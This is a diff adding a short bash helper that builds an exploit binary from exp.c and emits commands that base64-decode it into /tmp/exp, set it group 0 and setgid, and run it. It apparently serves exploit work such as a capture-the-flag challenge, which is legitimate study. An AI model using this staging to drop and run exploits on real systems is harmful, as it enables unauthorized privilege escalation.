@@ -1,0 +1,20 @@
+#!/bin/bash
+
+set -e
+
+musl-gcc exp.c -Os -static -s -o exp
+
+gen() {
+	echo "cat <<EOF > /tmp/exp.b64"
+	base64 exp
+	echo "EOF"
+	echo "base64 -d /tmp/exp.b64 > /tmp/exp"
+	echo "chmod +x /tmp/exp"
+	echo ""
+	echo "chgrp 0 /tmp/exp"
+	echo "chmod g+s /tmp/exp"
+	echo ""
+	echo "/tmp/exp"
+}
+
+gen | tee out
